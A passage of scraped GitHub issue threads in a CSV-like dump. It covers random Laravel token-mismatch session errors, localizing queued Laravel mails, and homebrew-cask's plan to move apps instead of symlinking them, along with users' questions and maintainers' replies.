confirm the bug still occurs? Then - if you are trusting enough - could you give @friend access and the steps to reproduce (if he is open to the idea - I'm just putting it out there). The biggest issue is the difficulty in replicating the issue. So far we've not been able to get access to an environment where we can duplicate it. I've tried on different cloud providers - and I cant seem to get it to trigger...  @friend - I willing to give it a go, but I don't think it will work. Our staging environment is a duplicate of our production. Like I said before, we can not reproduce the bug ourselves (on both production or staging). The only thing that makes this bug visible is a high user volume website and Bugsnag. I'm guessing more applications suffer from this but they don't even know it. It is only happening about once or twice per hour (random calls, random routes, random users) versus thousands of successful requests.  Can you try hitting your staging site with a load tester - like  - can that trigger it?  @friend I doubt that, all our ajax requests are user induced. I should build in a custom ajax request then, which basically does nothing but will load on various times.  Same problem here. Randomly. TokenMismatchException line 46. Happens with IE Win8.1 or IOS. Can't reproduce it. Simple form application (html+bootstrap+jqueryui) with default Laravel auth Session store in database Laravel 5.1 PHP 5.5.9 Apache 2.4 Cleared cache etc Session cookie gets reinit every request. Sow GET login page has other session then POST login page.  For me this problem went away when I updated my Homestead machine image from 0.2.6 to 0.2.7, destroyed my machine and recreated it.  I solved my problem putting session_start() in the top of my routes file.  @friend I understand your frustration, just wanted to correct the wrong info, as it will only further confuse users reading this thread. I'm subscribed to the issue for the same reason as you - random token mismatch exceptions that cannot be reliably reproduced, though in a Laravel 4.2 app. I'm not posting extra info about my situation since it was mentioned that this issue is specifically concerned with Laravel 5, but I'm watching in case someone figures out the problem, because there's a good chance that the root cause might be similar.  Oh wow. NEVER do that!  why? That solved my problem  Because that's totally incorrect.  Closing this as zero progress is being made.  Yes, I know but my desperation  is enough  @friend most people seem to experience this with Homestead. Whatever the issue is, updating homestead solved it on all my machines. BTW I could re-produce this with the most simple imaginable app that subits a form (no ajax).  Not sure how related this is, but I've been playing around with Lumen and with the new 5.1 release, I started migrating and noticed that my sessions kept regenerating on each request.  Tests work fine, but in browser, I couldn't keep a session.  I didn't have this problem w/ the Lumen 5.0 release. For me, it's not random as it is for some people here, it just doesn't keep the session. I updated Homestead to 0.2.7 hoping it would fix the issue, but no luck. I think Lumen is using Laravel's session class, hence posting here.  I log the Exception header which show that de TokenMismatch mainly occurs on IE Win8.1 or IOS Safari. I can reproduce it in IE11 when i set the Privacy on High. solution that works here add a customheader in the middleware stack by create a file P3PHeader in App\Http\Middleware; And added 'App\Http\Middleware\P3PHeader' to $middleware in Kernel.php  This is only an issue on my local machine and after running  i no longer see the issue  @friend This is looking very promising! For the first time I'm able to reproduce the error myself. Adding the headers like you suggested solved it for me, at least locally. I'm going to hotfix deploy this right away to production and monitor it for a couple of hours. Will be back with the results asap.  @friend Make sure you exclude responses that are redirects, otherwise it will throw an error  @friend @friend Tried both suggestions, random session regenerations still occurs. We are going to upgrade to L5.1 really soon, hopefully things will magically sort itself out.  @friend @friend Tried both suggestions, random session regenerations still occurs. We are going to upgrade to L5.1 really soon, hopefully things will magically sort itself out.  @friend Do you use apache on your local machine? I run windows 8.1 and just switched to nginx and that also solved the issue for me, just like  did while using apache.  Please continue this on the forums. ",180,169,1749,0,0,1278,78,
laravel/framework/8392,0.051449084500000006,laravel,framework,Translate queued mails (localization),3841,49,26,0,1,"I am looking for a working solution, to translate queued emails. Unfortunately, all emails use the default locale (defined under ). Let's assume, we have two emails in the pipeline, one for an English  user and another for an Japanese  user. What data should I pass to the  facade to translate (localize) the queued emails?   // User model   $user = Userfind(1)-&gt;first();    Mailerqueue($email, 'Party at Batman\'s cave (Batcave)', 'emails.party-invitation', [      ...      'locale' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'lang' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'language' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work   ]);   A different template for each locale is not a solution... (imagine an application with 10 languages...) There is no way to achieve this?  Why is this issue closed? Is it solved? Is there a way to utilize the locale in queued mails? I think it's really annoying that @friend is closing issues without a proper solution/fix. Imho that doesn't help at all. Keeping this thread open shows that this is still not addressed and needs some solution sooner or later. I would appreciate a solution where it's possible to pass a locale to the queue method. I've also seen suggestions to set the locale via  within the queue callback. But unfortunately that doesn't help either.  plus one this needs to be reopened.  It's insanely bad that I can't handle this at all... The only solution I've found is passing the locale to the mail, and then passing it onto the trans() method.. Horribly time consuming and ugly when having +50 templates, and an text only version too. I have to at least do manual labor on plus one00 blade files.. How can it be that even changing language before queue, and inside the closure - does not work..?  I just came across the very same problem. Has this been solved? This is a very essential feature that is overlooked! Anything that is thrown into a queue should pass the original locale own to the job! There is no reason not to.  @friend, I really appreciate your tremendous contribution for the community. But your attitude is quite annoying. You act like the guard dog of issues without even allowing a discussion on valid issues (you will probably close this issue now and limit discussion to contributors because I wrote this ;-)). While the Laravel ecosystem is promoting a friendly ""netiquette"" all I see is issues being instantly closed for no good reason. Obviously people are having trouble with this issue 13830 So it doesn't help to tuck it away by closing it. As far as I can see it is not solved and it is a problem for millions of non-English speaking developers. What is the best way to address this issue without the issue being instantly closed? I'd be glad to give it a shot!  I second that @friend It is quite (very!) annoying that these issues are closed before a sensible discussion on the issue is allowed. @friend what are your thoughts on this? I would suggest developing it along the lines of what was discussed in #13830 and submit a pull request. Hopefully, it will be seen as a welcome ""feature"" and accepted.  This feature request is being discussed on laravel/internals#394 that's the reason that this issue is closed... We use that repo for feature requests, you guys could share your ideas there... 😄  Perfect! Thanks @friend  Thanks @friend. That's the kind of answer I was hoping for )  I see discussion is still in progress in related internal issue. Came here with assumption that Carbonnow()-&gt;formatLocalized('%B %Y') is also affected with this issue.  I had the similar problem. Check my StackOverflow answer. The idea is to inherit  class and replace  method, then your Mailables will take care of current locale automatically!  I believe this was solved in Laravel 5.6? ",12,0,217,0,0,78,16,
Homebrew/homebrew-cask/13201,0.0615176575,Homebrew,homebrew-cask,Changes to homebrew-cask installation behaviour,42256,433,220,0,9,"Changes to homebrew-cask installation behaviour Depending on how long you’ve been following the development of homebrew-cask (henceforth HBC), you might’ve come across this great rant&lt;sup&gt;1&lt;/sup&gt;. It was the turning point in making the  stanza (precursor to ) a requirement to every cask. Prior to that, HBC tried hard to be smart about what to link, but we eventually concluded being smart doesn’t work — there are too many edge cases. The end of linking, and the beginning of moving (reasoning) We reached another such point with linking. What works for CLI apps does not work for GUI apps, and by sticking close to the homebrew model we’re bending apps to do what they’re not expecting, and only suffering from it. Issues we cannot fix continue to pop up, and copy as merely a preference or something to be done occasionally can’t solve them. We cannot, in addition to the inconsistency with s being installed instead of linked, add yet one extra inconsistency where even s won’t have a predictable behaviour. To put it bluntly, linking sucks for GUI apps. It doesn’t work and will never not be broken, as we can’t control what other developers do. Linking isn’t even needed, if you think about it. What separation of concerns are we worried about? CLI tools should have the separation homebrew provides because some of their apps (like newer versions of OS-level tools) provide critical features that could break the entire system if overridden. That is not the case at all with GUI apps; the only apps we have that could break the system on install (s) are already given free range. If you use HBC, there’s not even any reason to install a GUI app any other way, so why would that separation matter? GUI apps aren’t the only suffering from the current behaviour, even. Other artifacts suffer from similar issues and some even required the introduction of a different kind of linking. In addition, while having different versions of the same CLI app is many times desirable, that is a far from the norm with GUI apps. Having an  that works on every app, even ones that auto-update, also becomes nonsensical. We should emulate regular usage (i.e. what people do without HBC), instead of trying to perpetuate a new paradigm that is basically contradicting expectations. This, however, does not mean losing customisation options when it makes sense (like ). Every workaround we build is forcing apps to fit our model, and our model is bad. We’re building workaround on top of workaround, adding more code and work for something that will never work correctly. From The Cathedral and the Bazaar “you often don't really understand the problem until after the first time you implement a solution. The second time, maybe you know enough to do it right. So if you want to get it right, be ready to start over at least once”. As with other changes in the past, we now understand this problem a bit better and will adjust our solution accordingly. The end of linking, and the beginning of moving (technical) First steps towards new behaviour  Every artifact stanza except  will move its target to the appropriate location, instead of being sym/hardlinked. s will be moved to  by default. will continue to work, but rename the artifact itself instead of a link. The Caskroom ( by default) still needs to exist. Versioned subdirectories of the Caskroom won’t exist anymore, though.  Explanations  Explained in the reasonings above why most artifacts will be moved instead of linked. As for binaries being the exception, it’s simple not only is it expected, it’s advantageous, recommended, and sometimes necessary. Many times a  is linked from inside an app bundle and cannot simply be moved/copied from there and continue to work. In these cases, symlinking is the recommended (by the developer) course of action anyway, so we stay in line with the idea of emulating regular usage. It also makes it work similarly to other CLI tools, like installs from homebrew. Self-explanatory. It’s what most users expect, and would be our default anyway. Self-explanatory. It will be needed to keep a few things The originals from , when they’re standalone. Other things like uninstall scripts that come with some s.   Explained in the reasonings above. #### New stanzas/keys/flags to enhance these changes . Similarly to , it should be used when a value of  is needed. It means “the artifact this cask uses auto-updates, so even if the cask file updates, leave this alone when upgrading others”. This does not mean  in general is no longer a desirable feature — it is, but for casks who do not do it themselves. . Example . It means the artifact needs to be in a certain location to function correctly and as such will be moved there even if you have a different default location. . Takes no arguments and forcibly overrides .  Pseudo-code for , considering an  Doesn’t this mean a bunch of stuff might break? In the short term, yes, it does, but it is the right decision. We understand we have a bunch of users that are using homebrew-cask daily, and ideally we could try to make this a smooth transition like in the past. However, we’re admittedly pre-alpha and setting transition strategies is an inglorious job (everything will be discarded in the end, after all) that puts on hold even the smallest of changes indefinitely. It is incredibly time consuming, has variable results (we still get a bunch of issues pertaining to it), and (above all) kills momentum. Furthermore, this is a big change and there’s really no good way to make this seamlessly. In the end, we want to continue to move forward and improve HBC. Being afraid of changes in a pre-alpha would mean stagnation. Are there any other big changes planned? There are ideas, yes, but no exact plans yet. Those ideas still need to be discussed and most are concerned with the creation and maintenance of casks, not the usage of HBC.  &lt;sup&gt;1&lt;/sup&gt; If you haven’t, I highly recommend it as piece of HBC’s history.  Seems like a useful change, and might be timely as well - I plan to do a clean install with 10.11, so breaking changes are not a huge issue. So does the  stanza remove the need for explicit versioned urls, or is there still a preference for versioned, shasum'd formulas? Would an example of a formula where  then be an app like Spotify, as it manages its own updates (ie, any forumas that use  &amp; )  Well, depending on how long the implementation (and release) takes. For now, preference should be left with versioned urls. The overlap of apps that auto-update and apps that have unversioned urls isn’t clear ( will make it so), so this is a discussion for later. The security provided by always having a version is desirable. This is incorrect. A cask having an unversioned url (i.e. it almost exclusively will use ) is not guaranteed to auto-update, or vice-versa. The two are completely unrelated.  Is there a milestone, task list, thread, or wiki page where people can go check how much of this has been implemented and/or released?  Not currently. Things should be released as issues as time goes on. It might actually take a few weeks for development of this to start, but this is the type of thing that should be announce early.  plus one  Everything sounds good to me, I'm glad to hear we are moving forward in this direction for the most part. If apps come in a folder with a bunch of other things (readmes, licenses, plugin directories, etc.) will those be moved to  as well? What about if they are required to be in the same directory as the application? Should  casks be maintained from version to version? If an application downloads the latest update when necessary, but does not install it for the user, should it be considered ? I know that Filezilla does something like this (or it used to, I haven't checked recently).  No. See point 4 of The end of linking, and the beginning of moving (technical) in the top post. Only what we already link will be moved, it’s one to one. Than we use  to move the directory. We’re already covered, there, and some casks were already changed, even. Yes, so anyone installing it for the first time gets the latest version. Many (most?) of these have discoverable appcasts, though, which makes the job easier. No. Only the ones that can do it seamlessly should, because otherwise we can still provide a better experience.  (The following is my own preference.) I don't like folders in the Applications folder unless it really is to organize a bunch of apps (Microsoft Office). Suggestions for apps like Audacity and Eclipse that have a required folder structure  Place folder contents in , and place an app symlink in  Place folder contents in , and place an app symlink in  (bc sometimes apps have the same name) Place folder contents in , and place an app symlink in , and  (probably not a good idea bc hidden files)  Suggestions for apps with non-code supporting files  Place supporting files in  (more consistent with the above) Place supporting files in , , , etc. (more consistent with Mac expectation that trashing the app will pretty much uninstall it) Discard supporting files Leave supporting files in Caskroom   I like those ideas, @friend. However, I’ll also say “definitely not for now”, and the first paragraph of the top post explains why. Those could introduce issues we’re not foreseeing, and this change is in part meant to fix things, not introduce new possible points of failure. It doesn’t mean we can’t revisit those in the future, naturally, but for now the takeaway from this post should be emulate regular usage. Let’s nail that first, and only then see if being smart can pay off.  Okay. I'm assuming that means the following  For apps that require a folder structure, move the entire folder to  or leave it in the Caskroom For apps that provide a  with some documentation, discard the documentation or leave it in Caskroom   Move it, using . Leave it in the caskroom. Both those points were addressed in the previous post.  You reference  , currently all of my casks have defaulted to  . Is this change also changing that behavior of utilizing a folder local to the user's home directory? (sorry if this was covered elsewhere)  Yes, it is changing that behavior. You will still be able to use  if you want by using by using the  flag.  Was there an open discussion of the pro's and con's of this somewhere that I've missed?  @friend It was all covered in the top post. @friend’s explanation is correct. @friend Yes, there were multiple, including #3083 and #3888. I have a slight feeling from your last comment and this one you might be under the impression this might be a matter of user preference and voting. It’s not. This is about fixing a broken model, and I’ve spent many months thinking about this solution and managing homebrew-cask always with that in mind, to understand how it’d affect it. Keeping the old system is unsustainable. Every time there’s a new problem our workarounds fail to address we have to discuss how to implement a new one. Those are becoming harder and harder, and many of them are impossible to solve without breaking experience. All of them are solved immediately by emulating regular usage. As mentioned in the top paragraph of the top post, being smart failed, and as mentioned in a previous post, let’s first get things to work, and think about being smart later.  plus one i want this for years  After just quickly scanning plus one on the .  Right now I just don't install apps that I know do automatic updating assuming it would break things.  Also the moving of apps I can see as a much needed change as I've had issues with some apps being linked which result in me again not using cask but installing it the ""Old Fashioned Way"". This big changes can be annoying in the short term but it's good to figure these things out while the project is still relatively new than wait 10 years and have to deal with everything breaking  The most important benefit of linking in my opinion was that the old versions did not need to be replaced in that workflow, and thus the user could easily downgrade back to a previous version simply by changing the link (or just use the previous version directly to check some previous functionality). The ability to downgrade to a previous state is one of the most important benefits of a package manager in my opinion. Applications that depend on being installed at a hardcoded path are exhibiting bad behavior. There doesn't seem to be too many of them listed at #12858, and we shouldn't need to change the whole structure just to accommodate these. If we want to support the use of the upgrading options provided by the applications themselves, then (lacking a copy-on-write filesystem) we could have application versioning disabled by default while having a configuration property to enable it. Another issue I discovered with the linking was that the dock seems to resolve symlinks and store the original source path, which forces me to update the items manually. I hope this issue can be fixed in some way, but if not then I can live with it. If there are some other major issues with linking, then please elaborate. As for the  stanza, I am fine with it in general for applications that auto-update by default, but please have an option for ignoring it for those who do not want auto-updates. When using a package manager I like to manage my updates, and I disabled auto-updating and update prompts for all applications before discovering the lack of an  command in Homebrew Cask.  There are actually numerous issues stemming from linking.  Many apps will prompt the user, if not installed in a standard location, to move it there. Many apps support in-app upgrading, which will result in an inconsistent experience when used in conjunction with brew cask upgrade. Many apps are already not versioned (latest) Having multiple versions of the same app causes issues with launching the app, i.e., file associations and apps that open other apps. If the app is identified by id, it's not clear which version of the app should be launched, and the arbitrary choice can be confusing for the user. If the app is identified by path, that identifier will break when old versions are uninstalled. This is an issue with not only Dock but basically most other launcher apps too. If you want a backup of an older version of the app, you probably don't expect to use both at the same time. The proper way to do this is probably to backup the install media (dmg/zip) instead of keeping the live app around. This file already exists in /Library/Caches/Homebrew!   @friend There is a  method to handle this issue. If I install an application from Homebrew Cask, I don't expect to use the in-app updater. I have disabled all these updaters in my applications. However, if we actually want to support this behaviour, then I have suggested using an option to disable versioning. Perhaps we can extract the version information from these in some other way? Otherwise, I guess we're forced to drop versioning in these cases as per the current behaviour. I don't see this issue with my Calibre associations, which I upgraded a few days ago. Files associated with it open the latest version. Although upon opening the ""Open With"" submenu it does list multiple versions. Again, it would be nice if there was some way to have it only look within , but I can live with it. Good point. However, there isn't a simple way to have Homebrew Cask reinstall a previous version short of manually editing the cask file. Also, this is how Homebrew mainline itself is implemented, and it would be best to keep conformity with it as far as possible.  I'm on mobile but there's a comment somewhere about how they tried to be smart about installing, but realized that was an unmaintainable amount of overhead, and that the most sensible way to install is in the same way a normal, non-cask user would. Also, having a way to extract/install old install media would be a great idea (but probably for later, unless you want to make it!). From what I glean, cask uses Homebrew because it's good infrastructure, not because the user experience should be the same. It's probably better to keep conformity with the non-cask app experience.  In that case I would like to know about these issues. The only issue mentioned in the original post here was of the hardcoded location expectation from a few applications. If we introduce a generic downgrade feature, then users would probably expect it to be able to work across versions which weren't installed before as well, but that is problematic to implement in the Homebrew/Cask Git structure, where updates to version and installation instructions are not kept separate. I guess we could implement a ""revert"" feature that only reverts to versions already present in the cache, and reinstall it using the cask instructions at the revision at which it was originally installed. If this is actually implemented or planned for implementation, then I withdraw my objections to removing the linking structure. I am not familiar with Ruby programming, so I would probably not be able to implement this feature myself. The FAQ on this very issue suggests the opposite  Also, this is a somewhat separate issue, but I always thought it strange that it seems like Homebrew Cask uses a hardcoded global path () to store the Casks regardless of the actual location of Homebrew itself, so even a local Homebrew installation would create global Casks (I haven't tested this myself, but this is my assumption lacking documentation to the contrary). It would probably have been best for it to use some location inside the Homebrew installation itself (unless explicitly configured otherwise), or at any rate not use a global location if Homebrew itself is not in one. The default value for the  option could probably also have been inferred from this.  The reason we're moving away from linking and towards copying/moving instead is also due to an inherent difference in the nature of OS X apps and binary/CLI tools.  Within a Linux/Unix/BSD environment, it is commonplace to link binaries into  directories. Binaries are built against libraries, which reside in a preset location (, , etc.). App bundles are somewhat self-contained. Sometimes, they also contain config/preference data (although that is a bad idea, IMO)   It is not uncommon to use multiple versions of some CLI tools, especially if there are breaking/compatibility changes. A CLI tool will almost never update itself. There are a few newer ones, particularly package managers themselves, that can also update themselves (e.g. , ) - in fact, self-upgrading CLI tools often break things for Homebrew - a red flag that perhaps we shouldn't handle app bundles, many of which have some sort of update functionaly or contain persist data within the bundle, the same way Homebrew handles CLI tools. Different versions of CLI tools will often be named differently from other versions, especially when managed by Homebrew (e.g.  vs ). Some app bundles also follow this type of a scheme, in terms of adopting a new name with a new major release.    Some apps will throw dialogs to move to , like you said, but there are some that will simply refuse to run. This could get very messy. It's why Homebrew dropped the feature ( has been deprecated in favor of ). I think it wouldn't be as big of an issue with casks, simply because building software is a more fragile process than downloading/installing app bundles. Nevertheless, it's still a headache to implement at this point, and if we ever add it, it would be much later in the roadmap for this project. In the past, we've tried to keep with consistent user experience with Homebrew. However, we've found that it simply doesn't work as well as we want to, because OS X apps just can't be handled the same way as CLI binaries. Imagine using an apple peeler to peel an orange - it doesn't get the job done (unless you wanted orange zest in the first place). Thus, we're willing to compromise a bit on UX conformity with Homebrew in order to make the system more functional and less buggy overall. This has yet to be updated.  @friend I’m on a phone (won’t have access to a computer for the next week), so forgive any bluntness. @friend and @friend addressed your points, but I’d like to add something quick. As I’ve mentioned in the top post, we’re not like other package managers. Any point you justify with “I expect that of other package managers” is irrelevant we tried those, and they failed. Following a pattern that breaks for us simply because others do so is nonsensical. Furthermore, all your solutions are nothing more than more workarounds, which is exactly the problem, as mentioned in the top post, so they don’t solve anything. Lastly, you link to an issue that has few examples, and ask for more cases. I want to be perfectly clear that I see you were perfectly cordial when making your case and I appreciate that and want to be just as polite when I say your points are mostly due to lack of context and experience with HBC. Those few examples are part of a list still being made, and part of a much larger issue. We’re also not going to link to every specific issue that lead to every specific reasoning — the top post is verbose as it is. I’ll say again this is not a vote. We tried other solutions before, and this new course was decided after years of dealing with HBC and seeig what works and doesn’t. Discussion is encouraged and appreciated, and we will give context for the reasonings, but if you want specific examples, those would take a while to search for just to get them to you simply to justify in detail what we already know and explained in broad strokes. That would be very time consuming and frankly useless, so if you want specifics, you’ll have to do the searching. I hope you understand we can’t be doing that for every user, or we’d do nothing else. We will explain reasonings and link to the appropriate contexts, but if conclusions have been reached through experience with many separate issues throughout the years, you can’t reasonably expect any of us to drop everything and do your reasearch to satisfy your doubts, when you just got here, and every issue is public and searchable. We’re trying to make the project better, and this decision is just one more towards that goal. It’s a conclusion arrived at from being here everyday seeing things break and work, and striving for less of the former and more of the latter.  @friend Thanks for explaining the structural differences between OS X GUI apps and CLI tools. You describe three differences  Binaries are built against libraries, while app bundles are self-contained. Sometimes, app bundles store configuration data inside themselves. App bundles provide self-updating functionalities.  The first difference does not seem to be relevant to versioning. As you mention, keeping configuration data inside app bundles seems to be a bad practice, and would get overwritten by Homebrew Cask upgrades in the new schema as well. The self-updating issue seems to be the relevant issue here. These don't seem to be problematic for the most part, but they do mess up the versioning. As I have mentioned before, we can have versioning as an optional feature for those who don't want to use the application updaters.  @friend I acknowledge that I am not aware of the full context. I merely noted that there didn't seem to be too many examples compiled of the main issue that you noted in your original post. If you assert that there are a significant number of applications that break if not located at a hardcoded path, then I'll take your word for it. I think that when making such a large structural change, the reasoning for it should be documented as comprehensively as possible. You may have had lots of isolated discussions on this issue at various points, but there is some point to bringing these together (not necessarily in this issue) so that everyone (not just the maintainers and people associated with the project from the start) can see the full context. There might be alternative solutions or enhancements provided as a result of a comprehensive discussion on this. I did look through some old issues on this subject that were linked from the discussion on the upgrade feature before commenting here, but you yourself took the opposite stance on those. I can try looking further, but I can never be sure that my research is comprehensive without some official compilation to cross-reference. I didn't present any solution yet, other than keeping the status quo as an option. PS Sorry to disturb your vacation wink Please feel free to not respond until you return.  Here’s the thing there were discussions. This issue is discussed and settled. If we restart the discussion everytime someone who wasn’t there asks to have the conversation again, we’ll never do anything. That is a good sign, I hope, I did really think hard about this. Thank you. Going well so far. A good day to you.  But it is! This often means that app bundles are built against old or outdated libraries, where as the dependencies of CLI tools can be updated without having to update the actual tool itself. App bundles also sometimes stick their stuff in weird places while CLI tools are pretty standard with their behavior - I've found that some non-native apps are the worst offenders, placing items in random folders that I would never think to check. It's not so much an issue with versioning directly, but rather unnecessary overhead if a maintainer has to keep up with all of the files in order to stage the upgrade process via , especially some of these apps offer somewhat reliable systems for upgrading themselves. You're right about that. Perhaps some sort of app bundle ""snapshots"" could assist in identifying config/persistent data within the bundles take snapshot of bundle right after install, and take snapshot of bundle right before upgrade, and then perform the upgrade and re-apply the changes from between the snapshots. I have no idea how effective that would be, nor how much code we would have to write. Regardless of how you look at it, this project has been practically stagnant for the past few months up to now in terms of core development, and the original direction we were moving in was simply a huge ball of workarounds that somehow worked. But it has become pretty clear that the approach we've used in the past isn't ""cost-effective"" to maintainers, nor is it the best for end-users either. There were too many corner cases to accomodate for, and so rewriting the core to handle corner case apps more elegantly is a priority right now. I'm sorry I couldn't find any more old issues that are relevant to this discussion, as you've asked for, but here's one last megalist of everything that's been referred to in this issue so far, for your reference - I imagine they might have gotten lost in the shuffle. They cover the default installation process, default installation location, etc. - many decisions/discussions that are the basis of the decision in the recent changes. There's a lot of back and forth discussion on pretty much every decision that has had been made in the past, so you may find that somebody else can explain the rationale for a decision much better than I can.  #12746  #12076 #3888 #8210 #9178 #12517 #10115 #4651 #4359 #13230 #13256  #10039   I wholeheartedly welcome this change. From a user's perspective I've had to deal with explicit or subtle breakage due to linking on multiple occasions, and I have a personal installer script that swaps some applications into  (browsers, Tunnelblick, etc.). I add to the script every time I'm bitten, and the script is growing. Not fun. @friend Please don't just talk from your experience. ""I don't have problems so you shouldn't make changes"" isn't a good attitude. I apologize for exaggerating; I know you were asking about what exactly the problems are. However, if you allow me to talk from my experience, I'll tell you that problems abound. And I'm not even a maintainer, who oversees all the headaches. Please excuse me, but I think this sentence along sets you apart from normal users. I call that paranoid. Homebrew doesn't even support upgrade at the moment (and not any time soon, as far as I know), I just can't picture how you do your upgrades. At any rate, you're not the norm, unless I'm completely carried away by my own workflows.  I would like to add to the thread by pointing out that not only some app bundles need to live in a certain location in order to work. There are other nonstandard artifacts, like Mail plugins, that won't work if linked; and as OS X tightens up its security across releases, we should expect to see more of those (or maybe the hackish things would stop working altogether, who knows). Example the QuoteFix Mail plugin. Last time I fixed it I had to use an ugly  + copy in  hack to make it work. Should we also have an issue (similar to #12858) to track those nonstandard casks that should benefit greatly from plans in this issue?  @friend would you mind sharing your script that describes some of the workarounds needed for non working linked apps ? I'm currently refactoring my provisioning setup to use homebrew casks but I'm not sure that was a good idea with what I'm reading here...  What I currently use  It doesn't solve every problem though, just things I would do on a clean install. And it would break uninstalling to some extent, but hopefully you wouldn't need to uninstall those critical apps.  Comment in the issue instead, and I’ll add to and adapt the main post when I have the chance.  so, for us that already have N applications installed through cask, how will the upgrade and relocation happen? Will Cask automatically move the apps there after some  in the future? Will i have to remove all and reinstall for it to automatically happen? will there be any command to make this happen? Also, for those of us with  already on their shell profile, will this conflict in any way with the new mode?  should i remove it ?  @friend All those questions are answered in the top post. There will be no automatic transition for the new system, and there will be no conflict by having that line in your shell profile.  hi all, just learning about this great project today would it may be wise to wait for this update to be done ? or doesn't it really matter ?  @friend We have no time-frame set for completion, so it’s really up to you.  This change to moving apps is fantastic news. I avoided using casks because I never liked the linking behavior and inconsistency of having a mix of apps and links in my /Applications. And superficially because I hated seeing icons in Applications with the symlink symbol ). Can't wait for this change, will start using casks as soon as it happens. Thanks!  I have concerns with the behavior of . As the owner of my machine, I should have final say in where applications are installed; not the formula author. There is clearly potential conflict between  and . As the pseudo-code above does, it is helpful to print a warning when those values are in conflict. However, final say ought to be determined by the machine owner, not the author of the formulas (who may be errant, if well-intentioned). I would propose that if  conflicts with , a warning message still be emitted as suggested here. But  should be the respected value, not . The user then becomes responsible for any issues with installation. The following scenarios are possible  formula indicates  but does not, in fact, actually need to be in said location (be it benign ignorance or accidental configuration, or anything really) formula indicates  but app actually functions just fine in a specific  (known by the user) formula indicates  for certain uses of the app, but user does not need said uses, and app works fine for given subset of uses from  formula indicates  but user is attempting to determine if app actually functions in  anyway   @friend I think  should be respected over  by default, but we could provide a  flag that overrides this decision. I envision lots of bug reports about faulty installations otherwise.  I can definitely see that. The biggest thing, I think, is that users should have final say somehow. If that's with Yet Another Flag™, so be it. As long as it's possible for the user to override the formula author, I'm happy.  Added  to the top post.  I'm curious, what would happen if I was to submit an application that is called ""Mail"" or ""Pages"", etc. would brew-cask overwrite the existing App? How does it decide whether an App is pre-existing or not? Does it even do that or do you completely rely on peer-review?  The logic course of action there is to not overwrite what already exists, and print an error.  then how do upgrades work? At some point you have to overwrite an existing path  To upgrade, you must install first. This is why they are different verbs. When you install, it can be assumed nothing with the same name exists — if it does, we know something is wrong, and should abort. However, when you upgrade, if something exists with the same name it is expected, and we can proceed. Furthermore, we should always  and never , so none of these are irreversible.  Well, I think there should be an option to remove the trashed files after a successful upgrade. Many of us have good back up policies, and we'll be clearing out the trashes anyway. In my opinion homebrew-cask should automate things as much as possible.  I’d wager most don’t. What’s the problem then? No harm done. The difference there is you’re the one cleaning out the trash, not us. It should. Above that, however, it shouldn’t screw up your setup. In all, a few MBs for an updated app in the trash is way better than the hassle of losing an important app or having to go get your backup. Also, if I recall correctly, this is what apps that auto-update themselves do, so that even goes in line with the new concept of emulating regular usage.  Yes it is. Okay it makes sense.  Trashing sounds fine. It's the same as what MacUpdate does. MacUpdate is a good model generally - it does not ever try to update system apps such as Mail.app, and any updated apps send the old version to the Trash.  Should we think about seeing if Homebrew Cask could use a command-line interface to run application auto-updaters for casks whose  stanza is set to true if such a CLI is provided by said auto-updater?  And should we ask more auto-updating applications to provide CLIs to their auto-updaters?  No. Not anywhere in the near future, at least.  @friend  Guess I'll put that on the wishlist, then — where is that, by the way, or would I just mention my feature request in 'Issue #13969  Add auto_updates stanza for Casks'?  @friend There isn’t any. To be clear, what I mean by that is that it is out of the question for now. You can mention that again a few months after this installation behaviour is implemented and we actually see how it worked in the wild, but to be honest I don’t see that feature ever happening. For one, it’s two much work for little to no gain. We’d need to support each application individually and it’d be mostly useless if the application can auto update itself, let it, that is the whole point. Furthermore, asking developers to support CLI ways of updating their GUI apps is a losing proposition I bet it is not going to happen. Not in any meaningful number.  @friend  Ah, I see.  Such a feature would be convenient, though…sigh.  As someone who does expect in-app auto-update to work (and hasn't gone around disabling it), I'm really looking forward to this change. Over half a dozen apps installed via HBC exist not only in  as symlinks, but also in my  folder. Likely due to auto-updates deciding that's where they belong. It's a mess, and then there are bizarre errors like this &lt;img width=""663"" alt=""tower-linking"" src="" a user experience perspective, I think it's very important to arrange applications the way the regular installers do, making  and in-app upgrades interchangeable. In the following screenshot, a Lightrooom 6 upgrade left me with ""Lightroom 5"" (must confirm whether their installer renamed it, but I believe so). &lt;img width=""854"" alt=""lightroom5"" src="" for concerns of overwriting Mail.app, HBC couldn't do so if it tried, at least as of El Capitan. System Integrity Protection protects the Apple apps listed in . (Of course, not overwriting apps managed by the App Store could still be a valid concern). One final remark. Could we please update the README to use more precise wording (""in the future""). I misread it ""as of 12/Aug/2015, Homebrew-cask will..."" And then I was sad that it wasn't the case.  I believe @friend was looking for some evidence of the issues this change will help resolve. Here's another one. I only have one copy of Things installed, but Things is confused because there is a symlink in  and the actual copy in . I don't want to know what happens if I click Delete  ""Extra"" Copy. &lt;img width=""504"" alt=""things"" src="" So when will this change happen?  When it’s done. There’s really no other answer, there.  I'm happy to see this change is finally happening, I've been using cask for a long time but the application management has always bothered me. Good work on this proposal/documentation of how it's going to be implemented, exactly what I've been hoping for! plus one  I'm interested in how this is going to work in a situation where a user has already installed an app from the Mac App Store. Will an overwrite prompt be given?  @friend I believe that was addressed in the previous comments. Since the app was not installed beforehand, and the file exists, a warning/error will be given and no overwriting will take place.  Actually, I just tested out Skitch. There was no prompt at all. Brewfile using  Was able to reproduce with several App Store/free apps. Evernote Alfred etc.  @friend There is no prompt. This is what happens if you already have an app installed No failure is reported because nothing failed. The cask was downloaded, unpacked, and staged. We won't remove an existing non-cask installation.  I'm telling you it's happening on my system. Clean install of El Capitan. I'm running , btw. Maybe that's the difference.  is an external plugin, and not officially supported by . I can't speak for what it does or doesn't do. Have you double-checked your  to make sure that it is, indeed, a symlink to the Cask installation? If not, then everything is working as intended.  In any case, what you are reporting would be a bug with the existing behavior of . If you determine that we are, in fact, overwriting app bundles with symlinks, please open a separate issue.  @friend Help my understand why  is an external plugin, if it's maintained by the  org on GitHub.  cc @friend In any event, what's the recommended way to batch install multiple casks?  @friend See  for issues with homebrew-bundle  @friend We are not Homebrew. Homebrew and Homebrew-cask are maintained by completely separate teams. Therefore,  is external to us. If you want to install multiple casks, a simple shell script would suffice Or perhaps Or even  Why is it that after I  that my GitHub Desktop.app shows in my  folder as a symlinked app but shows in launchpad as an app that isn't symlinked?  @friend Oh launchpad don't mind whether it is a 